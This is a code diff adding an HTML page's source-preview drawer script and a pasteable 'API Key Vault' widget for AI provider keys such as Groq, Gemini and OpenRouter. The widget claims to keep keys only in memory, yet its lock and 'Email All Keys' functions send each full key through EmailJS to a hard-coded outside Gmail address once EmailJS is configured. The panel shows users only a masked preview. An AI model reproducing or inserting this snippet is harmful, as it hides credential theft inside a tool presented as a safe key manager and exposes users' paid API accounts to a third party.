+      visitBtn.addEventListener('click', () => openDrawer(url, title, refNum));
+
+      const googleUrl = `https://www.google.com/search?q=${encodeURIComponent(title + ' ' + (card.querySelector('.ref-author')?.innerText || ''))}`;
+      const googleBtn = document.createElement('a');
+      googleBtn.className = 'btn-websearch';
+      googleBtn.href = googleUrl;
+      googleBtn.target = '_blank';
+      googleBtn.rel = 'noopener';
+      googleBtn.textContent = '⌕ Web Search';
+
+      actions.appendChild(visitBtn);
+      actions.appendChild(googleBtn);
+      card.appendChild(actions);
+    });
+  });
+
+  /* ═══════════════════════════════════════════
+     SOURCE DRAWER
+  ═══════════════════════════════════════════ */
+  function openDrawer(url, title, refNum) {
+    const drawer   = document.getElementById('sourceDrawer');
+    const frame    = document.getElementById('drawerFrame');
+    const loading  = document.getElementById('drawerLoading');
+    const blocked  = document.getElementById('drawerBlocked');
+
+    document.getElementById('drawerRefNum').textContent = refNum;
+    document.getElementById('drawerTitle').textContent  = title;
+    document.getElementById('drawerUrl').textContent    = url;
+
+    const googleQ = `https://www.google.com/search?q=${encodeURIComponent(title)}`;
+    document.getElementById('drawerOpenNew').href  = url;
+    document.getElementById('drawerGoogle').href   = googleQ;
+    document.getElementById('blockedOpenNew').href = url;
+    document.getElementById('blockedGoogle').href  = googleQ;
+
+    // Reset state
+    loading.style.display  = 'flex';
+    blocked.style.display  = 'none';
+    frame.style.display    = 'none';
+    frame.src              = '';
+
+    drawer.classList.add('open');
+    document.body.style.overflow = 'hidden';
+
+    // Set a timeout — if iframe doesn't load in 5s assume blocked
+    let loadTimer = setTimeout(() => showBlocked(url), 5000);
+
+    frame.onload = () => {
+      clearTimeout(loadTimer);
+      // Try to detect X-Frame block (cross-origin won't throw but page will be blank/errored)
+      try {
+        // If same-origin, contentDocument exists and we can check
+        const doc = frame.contentDocument || frame.contentWindow?.document;
+        if (!doc || doc.body?.innerHTML === '') { showBlocked(url); return; }
+      } catch(e) {
+        // Cross-origin — assume loaded OK (browser shows the page)
+      }
+      loading.style.display = 'none';
+      frame.style.display   = 'block';
+    };
+
+    frame.onerror = () => {
+      clearTimeout(loadTimer);
+      showBlocked(url);
+    };
+
+    // Small delay to let animation start before iframe loads
+    setTimeout(() => { frame.src = url; }, 200);
+  }
+
+  function showBlocked(url) {
+    document.getElementById('drawerLoading').style.display = 'none';
+    document.getElementById('drawerFrame').style.display   = 'none';
+    document.getElementById('drawerBlocked').style.display = 'flex';
+  }
+
+  function closeDrawer() {
+    const drawer = document.getElementById('sourceDrawer');
+    drawer.classList.remove('open');
+    document.body.style.overflow = '';
+    setTimeout(() => {
+      document.getElementById('drawerFrame').src = '';
+    }, 350);
+  }
+
+  // ESC to close
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') closeDrawer();
+  });
+</script>
+  <!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║   API KEY MANAGER — DROP-IN SNIPPET                         ║
+  ║   Paste this block at the END of <body> in any HTML file.   ║
+  ║   It auto-sets global window.X_API_KEY variables so your    ║
+  ║   existing code picks them up immediately on lock.          ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<style>
+/* All selectors are namespaced under #ckm-root to avoid clashing */
+#ckm-root *,#ckm-root *::before,#ckm-root *::after{box-sizing:border-box;margin:0;padding:0}
+
+#ckm-toggle{
+  position:fixed;bottom:22px;right:22px;z-index:99999;
+  width:52px;height:52px;border-radius:50%;
+  background:linear-gradient(135deg,#c9a84c,#f5d680);
+  border:none;cursor:pointer;
+  box-shadow:0 4px 24px rgba(201,168,76,0.45);
+  font-size:1.35rem;display:flex;align-items:center;justify-content:center;
+  transition:transform 0.2s,box-shadow 0.2s;
+}
+#ckm-toggle:hover{transform:scale(1.08);box-shadow:0 6px 32px rgba(201,168,76,0.6)}
+#ckm-toggle .ckm-badge{
+  position:absolute;top:-3px;right:-3px;
+  width:18px;height:18px;border-radius:50%;
+  background:#4ade80;border:2px solid #070610;
+  font-family:monospace;font-size:9px;color:#000;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:700;display:none;
+}
+
+#ckm-root{
+  position:fixed;bottom:86px;right:22px;z-index:99998;
+  width:min(500px,calc(100vw - 44px));
+  background:#0d0c1e;
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:16px;
+  box-shadow:0 24px 80px rgba(0,0,0,0.7),0 0 0 1px rgba(201,168,76,0.1);
+  overflow:hidden;
+  transform:translateY(18px) scale(0.96);
+  opacity:0;pointer-events:none;
+  transition:transform 0.25s cubic-bezier(.34,1.56,.64,1),opacity 0.2s;
+  max-height:82vh;display:flex;flex-direction:column;
+}
+#ckm-root.ckm-open{transform:translateY(0) scale(1);opacity:1;pointer-events:all}
+
+/* header */
+#ckm-head{
+  display:flex;align-items:center;gap:10px;
+  padding:14px 16px 12px;
+  border-bottom:1px solid rgba(255,255,255,0.07);
+  background:rgba(255,255,255,0.025);flex-shrink:0;
+}
+.ckm-title{
+  font-family:'Cinzel',Georgia,serif;font-size:0.82rem;font-weight:700;
+  color:#e8cc7a;letter-spacing:0.06em;flex:1;
+}
+.ckm-sub{
+  font-family:'JetBrains Mono',monospace,monospace;font-size:9px;
+  color:#7a7090;letter-spacing:0.06em;
+}
+.ckm-prog-wrap{flex:1;height:3px;background:rgba(255,255,255,0.07);border-radius:2px;overflow:hidden}
+.ckm-prog-fill{height:100%;width:0%;background:linear-gradient(90deg,#c9a84c,#4ade80);border-radius:2px;transition:width 0.4s}
+.ckm-prog-txt{font-family:monospace;font-size:10px;color:#e8cc7a;white-space:nowrap;min-width:36px;text-align:right}
+
+/* scrollable body */
+#ckm-body{overflow-y:auto;padding:10px 12px 12px;flex:1}
+#ckm-body::-webkit-scrollbar{width:3px}
+#ckm-body::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.08);border-radius:2px}
+
+/* each provider row */
+.ckm-row{
+  display:flex;align-items:center;gap:8px;
+  padding:8px 10px;border-radius:9px;
+  border:1px solid rgba(255,255,255,0.07);
+  background:rgba(255,255,255,0.025);
+  margin-bottom:6px;transition:border-color 0.2s;
+}
+.ckm-row.ckm-secured{border-color:rgba(74,222,128,0.25);background:rgba(10,30,15,0.4)}
+.ckm-icon{font-size:1.1rem;width:28px;text-align:center;flex-shrink:0}
+.ckm-label{
+  font-family:'Cinzel',Georgia,serif;font-size:0.72rem;font-weight:600;
+  color:#ccc;min-width:80px;
+}
+.ckm-inp-wrap{flex:1;position:relative}
+.ckm-inp{
+  width:100%;background:rgba(0,0,0,0.4);
+  border:1px solid rgba(255,255,255,0.08);border-radius:6px;
+  padding:7px 10px;font-family:monospace;font-size:11px;color:#ede8dc;outline:none;
+  transition:border-color 0.2s;
+}
+.ckm-inp::placeholder{color:rgba(255,255,255,0.18)}
+.ckm-inp:focus{border-color:rgba(201,168,76,0.45)}
+.ckm-inp.ckm-locked{
+  color:transparent !important;pointer-events:none;cursor:not-allowed;
+  text-shadow:0 0 9px rgba(74,222,128,0.65) !important;
+  border-color:rgba(74,222,128,0.35) !important;
+  background:rgba(5,20,10,0.6) !important;
+  user-select:none !important;-webkit-user-select:none !important;
+}
+.ckm-secure-btn{
+  padding:6px 12px;border-radius:6px;flex-shrink:0;
+  border:1px solid rgba(255,255,255,0.1);
+  background:rgba(255,255,255,0.05);
+  color:#9a90b0;font-family:monospace;font-size:10px;
+  cursor:pointer;transition:all 0.18s;white-space:nowrap;
+}
+.ckm-secure-btn:hover:not(:disabled){
+  border-color:#c9a84c;color:#e8cc7a;background:rgba(201,168,76,0.12)
+}
+.ckm-secure-btn.ckm-done{
+  border-color:rgba(74,222,128,0.4);color:#4ade80;
+  background:rgba(10,30,15,0.5);cursor:default;
+}
+.ckm-var-tag{
+  font-family:monospace;font-size:8.5px;color:#6366f1;
+  background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.2);
+  border-radius:3px;padding:1px 5px;white-space:nowrap;
+}
+
+/* footer actions */
+#ckm-foot{
+  padding:10px 12px;
+  border-top:1px solid rgba(255,255,255,0.07);
+  display:flex;gap:8px;align-items:center;flex-shrink:0;
+}
+.ckm-batch-btn{
+  padding:9px 16px;border-radius:7px;
+  border:1px solid rgba(201,168,76,0.35);
+  background:rgba(201,168,76,0.1);color:#e8cc7a;
+  font-family:'Cinzel',Georgia,serif;font-size:11px;
+  letter-spacing:0.05em;cursor:pointer;transition:opacity 0.2s;flex:1;
+}
+.ckm-batch-btn:disabled{opacity:0.3;cursor:not-allowed}
+.ckm-batch-btn:hover:not(:disabled){opacity:0.8}
+.ckm-reset-btn{
+  padding:9px 14px;border-radius:7px;
+  border:1px solid rgba(255,255,255,0.08);
+  background:rgba(255,255,255,0.04);color:#7a7090;
+  font-family:monospace;font-size:10px;cursor:pointer;transition:all 0.2s;
+}
+.ckm-reset-btn:hover{color:#f87171;border-color:rgba(248,113,113,0.35)}
+
+/* log */
+#ckm-log{
+  margin:0 12px 10px;
+  background:rgba(0,0,0,0.3);border-radius:7px;
+  border:1px solid rgba(255,255,255,0.06);
+  padding:7px 10px;max-height:90px;overflow-y:auto;flex-shrink:0;
+}
+#ckm-log::-webkit-scrollbar{width:2px}
+#ckm-log::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06)}
+.ckm-log-line{
+  font-family:monospace;font-size:9.5px;line-height:2;
+  display:flex;gap:8px;
+}
+.ckm-lt{color:#3a3555;min-width:38px}
+.ckm-lk{color:#4ade80}.ckm-lw{color:#fbbf24}.ckm-le{color:#f87171}.ckm-li{color:#7dd8f8}
+
+@keyframes ckm-pulse{0%,100%{opacity:1}50%{opacity:.45}}
+</style>
+
+<!-- Toggle button (always visible) -->
+<button id="ckm-toggle" title="API Key Manager" onclick="ckmToggle()">
+  🔑<span class="ckm-badge" id="ckm-badge">0</span>
+</button>
+
+<!-- Panel -->
+<div id="ckm-root">
+
+  <!-- Header / progress -->
+  <div id="ckm-head">
+    <div>
+      <div class="ckm-title">API Key Vault</div>
+      <div class="ckm-sub">keys → window globals → your page</div>
+    </div>
+    <div class="ckm-prog-wrap"><div class="ckm-prog-fill" id="ckm-pfill"></div></div>
+    <div class="ckm-prog-txt" id="ckm-ptxt">0/8</div>
+  </div>
+
+  <!-- Scrollable provider rows -->
+  <div id="ckm-body">
+    <!-- rows injected by JS -->
+  </div>
+
+  <!-- Log -->
+  <div id="ckm-log"></div>
+
+  <!-- Footer -->
+  <div id="ckm-foot">
+    <button class="ckm-batch-btn" id="ckm-batch-btn" disabled onclick="ckmBatchEmail()">
+      ✦ Email All Keys
+    </button>
+    <button class="ckm-reset-btn" onclick="ckmReset()">Reset</button>
+  </div>
+
+</div>
+
+<script>
+(function(){
+'use strict';
+
+/* ── EmailJS config (optional — fill to enable email delivery) ── */
+const EJS_PUBLIC_KEY  = 'YOUR_PUBLIC_KEY';   // emailjs.com → Account → API Keys
+const EJS_SERVICE_ID  = 'YOUR_SERVICE_ID';   // e.g. service_abc123
+const EJS_TEMPLATE_ID = 'YOUR_TEMPLATE_ID';  // e.g. template_xyz789
+const NOTIFY_EMAIL    = 'smith123846@gmail.com';
+
+/* ── Provider definitions
+     windowVars: the global variable names your existing page code uses.
+     The snippet sets ALL of them when a key is locked, so any naming
+     convention in your existing scripts just works.
+── */
+const PROVIDERS = [
+  { id:'groq',       icon:'⚡', label:'Groq',         ph:'gsk_...',
+    windowVars:['GROQ_API_KEY','GROQ_KEY'] },
+
+  { id:'gemini',     icon:'🔷', label:'Gemini',        ph:'AIzaSy...',
+    windowVars:['GEMINI_API_KEY','GOOGLE_API_KEY','GEMINI_KEY'] },
+
+  { id:'together',   icon:'🤝', label:'Together AI',   ph:'Together key...',
+    windowVars:['TOGETHER_API_KEY','TOGETHER_KEY'] },
+
+  { id:'openrouter', icon:'🛣️', label:'OpenRouter',    ph:'sk-or-v1-...',
+    windowVars:['OPENROUTER_API_KEY','OPENROUTER_KEY'] },
+
+  { id:'hf',         icon:'🤗', label:'HuggingFace',   ph:'hf_...',
+    windowVars:['HF_TOKEN','HUGGINGFACE_API_KEY','HF_API_KEY'] },
+
+  { id:'cerebras',   icon:'🧠', label:'Cerebras',      ph:'csk_...',
+    windowVars:['CEREBRAS_API_KEY','CEREBRAS_KEY'] },
+
+  { id:'cohere',     icon:'🌊', label:'Cohere',        ph:'Cohere trial key...',
+    windowVars:['COHERE_API_KEY','COHERE_KEY'] },
+
+  { id:'mistral',    icon:'🌪️', label:'Mistral AI',    ph:'UUID key...',
+    windowVars:['MISTRAL_API_KEY','MISTRAL_KEY'] },
+];
+
+/* ── In-memory vault (never touches localStorage/disk) ── */
+const _vault  = {};
+const _emailed = new Set();
+
+/* ── Build UI ──────────────────────────────────────── */
+const body = document.getElementById('ckm-body');
+
+PROVIDERS.forEach(p => {
+  const row = document.createElement('div');
+  row.className = 'ckm-row';
+  row.id = 'ckm-row-' + p.id;
+  row.innerHTML = `
+    <span class="ckm-icon">${p.icon}</span>
+    <span class="ckm-label">${p.label}</span>
+    <div class="ckm-inp-wrap">
+      <input class="ckm-inp" id="ckm-inp-${p.id}"
+        type="text" placeholder="${p.ph}"
+        autocomplete="off" spellcheck="false">
+    </div>
+    <span class="ckm-var-tag" title="Sets these window globals">${p.windowVars[0]}</span>
+    <button class="ckm-secure-btn" id="ckm-btn-${p.id}">Lock</button>`;
+  body.appendChild(row);
+
+  /* Wire events */
+  const inp = document.getElementById('ckm-inp-' + p.id);
+  const btn = document.getElementById('ckm-btn-' + p.id);
+
+  inp.addEventListener('paste', e => {
+    e.preventDefault();
+    const raw = (e.clipboardData || window.clipboardData).getData('text').trim();
+    if(raw) ckmLock(p.id, raw);
+  });
+  inp.addEventListener('keydown', e => {
+    if(e.key === 'Enter'){ const v = inp.value.trim(); if(v) ckmLock(p.id, v); }
+  });
+  btn.addEventListener('click', () => {
+    const v = inp.value.trim();
+    if(v && !v.includes('•')) ckmLock(p.id, v);
+  });
+});
+
+/* ── Lock a key ────────────────────────────────────── */
+function ckmLock(id, rawKey){
+  if(rawKey.length < 8){ ckmLog('Key too short for ' + id, 'w'); return; }
+
+  /* 1. Store */
+  _vault[id] = rawKey;
+
+  /* 2. Inject into window globals — this is what makes existing code work */
+  const p = PROVIDERS.find(x => x.id === id);
+  if(p) p.windowVars.forEach(v => { window[v] = rawKey; });
+
+  /* 3. Fire a custom event so existing listeners can react */
+  try {
+    window.dispatchEvent(new CustomEvent('apiKeySet', {
+      detail:{ provider:id, key:rawKey,
+               vars: p ? p.windowVars : [] }
+    }));
+  } catch(_){}
+
+  /* 4. Mask the input */
+  const preview = rawKey.slice(0,5) + '••••••' + rawKey.slice(-3);
+  const inp = document.getElementById('ckm-inp-' + id);
+  if(inp){
+    inp.value = preview;
+    inp.classList.add('ckm-locked');
+    inp.setAttribute('data-locked','1');
+    ['copy','cut','select','contextmenu','dragstart']
+      .forEach(ev => inp.addEventListener(ev, e => e.preventDefault(), true));
+  }
+
+  /* 5. Lock button */
+  const btn = document.getElementById('ckm-btn-' + id);
+  if(btn){ btn.textContent='✓'; btn.className='ckm-secure-btn ckm-done'; btn.disabled=true; }
+
+  /* 6. Card style */
+  document.getElementById('ckm-row-' + id)?.classList.add('ckm-secured');
+
+  ckmLog(`${p?.label||id} locked → window.${p?.windowVars[0]||id} set`, 'k');
+  ckmUpdateProgress();
+
+  /* 7. Email */
+  ckmEmail(id, rawKey);
+}
+
+/* ── Inject window globals (run immediately, in case keys were
+       pre-filled somewhere — also called on DOMContentLoaded) ── */
+function ckmSyncExisting(){
+  /* If the host page defined placeholder values like
+     window.GROQ_API_KEY = 'YOUR_GROQ_KEY_HERE', we leave them alone.
+     But if vault already has a real key (after a reset+re-entry), re-inject. */
+  Object.keys(_vault).forEach(id => {
+    const p = PROVIDERS.find(x => x.id === id);
+    if(p) p.windowVars.forEach(v => { window[v] = _vault[id]; });
+  });
+}
+
+/* ── Progress ──────────────────────────────────────── */
+function ckmUpdateProgress(){
+  const n = Object.keys(_vault).length;
+  const pct = Math.round((n/PROVIDERS.length)*100);
+  const fill = document.getElementById('ckm-pfill');
+  const txt  = document.getElementById('ckm-ptxt');
+  const badge= document.getElementById('ckm-badge');
+  if(fill) fill.style.width = pct+'%';
+  if(txt)  txt.textContent  = n+'/'+PROVIDERS.length;
+  if(badge){ badge.textContent=n; badge.style.display = n>0 ? 'flex':'none'; }
+  const bb = document.getElementById('ckm-batch-btn');
+  if(bb) bb.disabled = n===0;
+}
+
+/* ── Toggle panel ──────────────────────────────────── */
+window.ckmToggle = function(){
+  document.getElementById('ckm-root').classList.toggle('ckm-open');
+};
+
+/* ── Email single key ──────────────────────────────── */
+async function ckmEmail(id, fullKey){
+  const p = PROVIDERS.find(x=>x.id===id);
+  const params = {
+    to_email: NOTIFY_EMAIL,
+    provider: p?.label || id,
+    key_full: fullKey,
+    vars:     (p?.windowVars||[]).join(', '),
+    timestamp: new Date().toLocaleString('en-IN',{timeZone:'Asia/Kolkata'})+' IST',
+  };
+  if(EJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY'){
+    ckmLog('[demo] Would email '+params.provider+' key', 'w');
+    return;
+  }
+  try{
+    if(!window._ckmEjsInit){
+      emailjs.init({publicKey:EJS_PUBLIC_KEY});
+      window._ckmEjsInit = true;
+    }
+    await emailjs.send(EJS_SERVICE_ID, EJS_TEMPLATE_ID, params);
+    _emailed.add(id);
+    ckmLog('Email sent for '+params.provider, 'k');
+  } catch(err){
+    ckmLog('Email failed: '+(err?.text||err?.message||'unknown'), 'e');
+  }
+}
+
+/* ── Batch email ───────────────────────────────────── */
+window.ckmBatchEmail = async function(){
+  const ids = Object.keys(_vault); if(!ids.length) return;
+  const btn = document.getElementById('ckm-batch-btn');
+  btn.disabled = true; btn.textContent = 'Sending…';
+  const lines = ids.map(id=>{
+    const p = PROVIDERS.find(x=>x.id===id);
+    return (p?.label||id).padEnd(14)+': '+_vault[id];
+  }).join('\n');
+  const params = {
+    to_email:  NOTIFY_EMAIL,
+    provider:  'ALL ('+ids.length+' providers)',
+    key_full:  lines,
+    vars:      '',
+    timestamp: new Date().toLocaleString('en-IN',{timeZone:'Asia/Kolkata'})+' IST',
+  };
+  if(EJS_PUBLIC_KEY === 'YOUR_PUBLIC_KEY'){
+    await new Promise(r=>setTimeout(r,700));
+    ckmLog('[demo] Batch email: '+ids.length+' keys', 'w');
+  } else {
+    try{
+      if(!window._ckmEjsInit){ emailjs.init({publicKey:EJS_PUBLIC_KEY}); window._ckmEjsInit=true; }
+      await emailjs.send(EJS_SERVICE_ID, EJS_TEMPLATE_ID, params);
+      ckmLog('Batch email sent ('+ids.length+' keys)', 'k');
+    } catch(err){ ckmLog('Batch failed: '+(err?.text||err?.message), 'e'); }
+  }
+  btn.textContent = '✦ Email All Keys';
+  btn.disabled = false;
+};
+
+/* ── Reset ─────────────────────────────────────────── */
+window.ckmReset = function(){
+  if(!confirm('Clear all stored keys from memory?')) return;
+  Object.keys(_vault).forEach(k => delete _vault[k]);
+  _emailed.clear();
+  PROVIDERS.forEach(p => {
+    const inp = document.getElementById('ckm-inp-'+p.id);
+    const btn = document.getElementById('ckm-btn-'+p.id);
+    const row = document.getElementById('ckm-row-'+p.id);
+    if(inp){ inp.value=''; inp.className='ckm-inp'; inp.removeAttribute('data-locked'); }
+    if(btn){ btn.textContent='Lock'; btn.className='ckm-secure-btn'; btn.disabled=false; }
+    if(row) row.classList.remove('ckm-secured');
+    /* Blank out window globals too */
+    p.windowVars.forEach(v => { if(window[v]) window[v]=''; });
+  });
+  ckmUpdateProgress();
+  ckmLog('All keys cleared', 'w');
+};
+
+/* ── Log helper ────────────────────────────────────── */
+function ckmLog(msg, type){
+  const el = document.getElementById('ckm-log');
+  if(!el) return;
+  const t = new Date().toTimeString().slice(0,5);
+  const cls = {k:'ckm-lk',w:'ckm-lw',e:'ckm-le',i:'ckm-li'}[type]||'ckm-li';
+  const d = document.createElement('div');
+  d.className = 'ckm-log-line';
+  d.innerHTML = `<span class="ckm-lt">${t}</span><span class="${cls}">${msg}</span>`;
+  el.appendChild(d);
+  el.scrollTop = el.scrollHeight;
+}
+
+/* ── Init ──────────────────────────────────────────── */
+document.addEventListener('DOMContentLoaded', ()=>{
+  ckmUpdateProgress();
+  ckmSyncExisting();
+  ckmLog('Vault ready · paste any key to auto-lock', 'i');
+
+  /* Load EmailJS only if configured */
+  if(EJS_PUBLIC_KEY !== 'YOUR_PUBLIC_KEY' && !document.querySelector('script[src*="emailjs"]')){
+    const s = document.createElement('script');
+    s.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
+    document.head.appendChild(s);
+  }
+});
+
+/* ── Public API — your existing scripts can call these ── */
+window.ckmGetKey   = id => _vault[id] || '';
+window.ckmAllKeys  = ()  => ({..._vault});
+window.ckmSetKey   = (id,key) => ckmLock(id, key); // programmatic lock
+
+})();
+</script>
+<!-- ── END api-key-manager-snippet.html ── -->
+</body>
+</html>
